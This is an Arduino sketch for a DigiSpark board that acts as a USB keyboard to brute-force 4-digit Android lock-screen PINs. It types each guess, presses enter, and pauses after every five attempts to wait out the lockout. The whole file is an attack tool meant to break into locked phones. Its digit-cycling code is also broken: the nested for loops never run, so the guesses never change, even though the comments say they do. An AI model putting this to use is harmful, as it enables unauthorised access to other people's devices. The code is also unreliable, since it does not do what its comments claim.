/*===============================================
DigiBruteDroid - A 4-Digit PIN Brute Force attack 
for USB-OTG Android devices. 
Written to support DigiStump's DigiSpark Model A.
Written by Seattleandrew
===============================================*/

#include "DigiKeyboard.h"
int num[] = {39, 30, 31, 32, 33, 34, 35, 36, 37, 38};
int a = 0; //1st digit
int b = 0; //2nd digit
int c = 0; //3rd digit
int d = 0; //4th digit
int count = 0;

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0); //this is generally not necessary but with some older systems it seems to prevent missing the first character after a delay
  delay(3000);
}

void loop() {
  //After 5 tries it waits 30 seconds and turns on the On-Board LED to indicate it is waiting.
  if(count == 5){
    digitalWrite(1,HIGH); //Change this to 0 if using DigiSpark model B
    DigiKeyboard.sendKeyStroke(40); //we hit enter to make the popup go away
    delay(31000);
    count = 0;
    digitalWrite(1,LOW);
  }
  DigiKeyboard.sendKeyStroke(num[a]);
  DigiKeyboard.sendKeyStroke(num[b]);
  DigiKeyboard.sendKeyStroke(num[c]);
  DigiKeyboard.sendKeyStroke(num[d]);
  DigiKeyboard.sendKeyStroke(40);
  delay(1000);
  count++;
  //If the 4th digit is past 9, it cycles back to 0 and increments the 3rd digit 
  //Initiate a for loop instead of multiple if conditions.
  for (d=0; d == 9; d++){
    for (c=0; c == 9; c++){
      for (b=0; b == 9; b++){
        for (a=0; a == 9; a++){
          //Much simpler than multiple ifs.
        }
      }
    }    
  }
}
